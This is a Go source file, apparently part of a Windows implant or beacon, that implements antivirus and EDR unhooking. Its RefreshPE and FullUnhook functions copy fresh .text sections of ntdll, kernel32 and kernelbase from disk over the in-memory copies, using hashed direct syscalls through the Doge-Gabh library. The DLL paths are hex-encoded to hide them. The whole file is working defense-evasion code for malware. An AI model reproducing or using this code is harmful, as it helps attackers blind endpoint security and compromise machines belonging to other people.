//go:build windows

package packet

import (
	"crypto/sha1"
	"encoding/hex"
	"errors"
	"fmt"
	"github.com/Binject/debug/pe"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"main/config"
	"main/sysinfo"
	"unsafe"
)

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

// RefreshPE reloads a DLL from disk into the current process
// in an attempt to erase AV or EDR hooks placed at runtime.
func RefreshPE(name string) error {
	df, e := ioutil.ReadFile(name)
	if e != nil {
		return e
	}
	f, e := pe.Open(name)
	if e != nil {
		return e
	}
	x := f.Section(".text")
	ddf := df[x.Offset:x.Size]
	return writeGoodBytes(ddf, name, x.VirtualAddress)
}

func writeGoodBytes(b []byte, pn string, virtualoffset uint32) error {
	t, err := windows.LoadDLL(pn)
	if err != nil {
		return err
	}
	h := t.Handle
	dllBase := uintptr(h)

	dllOffset := uint(dllBase) + uint(virtualoffset)
	var old uint32
	var thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
	sizet := len(b)

	protect, err := gabh.DiskHgate(str2sha1("NtProtectVirtualMemory"), str2sha1)
	if err != nil {
		return err
	}

	write, err := gabh.DiskHgate(str2sha1("NtWriteVirtualMemory"), str2sha1)
	if err != nil {
		return err
	}

	_, err = gabh.HgSyscall(
		protect,
		thisThread,
		uintptr(unsafe.Pointer(&dllOffset)),
		uintptr(unsafe.Pointer(&sizet)),
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&old)),
	)
	if err != nil {
		return err
	}

	_, err = gabh.HgSyscall(
		write,
		thisThread,
		uintptr(dllOffset),
		uintptr(unsafe.Pointer(&b[0])),
		uintptr(len(b)),
		0,
	)
	if err != nil {
		return err
	}

	_, err = gabh.HgSyscall(
		protect,
		thisThread,
		uintptr(unsafe.Pointer(&dllOffset)),
		uintptr(unsafe.Pointer(&sizet)),
		uintptr(old),
		uintptr(unsafe.Pointer(&old)),
	)
	if err != nil {
		return err
	}

	return nil
}

func FullUnhook() error {
	if config.Unhook {
		isOSX64, _ := sysinfo.IsOSX64()
		if !isOSX64 {
			return errors.New("Unhooking is not supported on windows x86 now.")
		}
		name1, _ := hex.DecodeString("633a5c77696e646f77735c73797374656d33325c6e74646c6c2e646c6c")
		name2, _ := hex.DecodeString("633a5c77696e646f77735c73797374656d33325c6b65726e656c33322e646c6c")
		name3, _ := hex.DecodeString("633a5c77696e646f77735c73797374656d33325c6b65726e656c626173652e646c6c")
		err := RefreshPE(string(name1))
		if err != nil {
			return err
		}
		err = RefreshPE(string(name2))
		if err != nil {
			return err
		}
		err = RefreshPE(string(name3))
		if err != nil {
			return err
		}
	}

	return nil

}
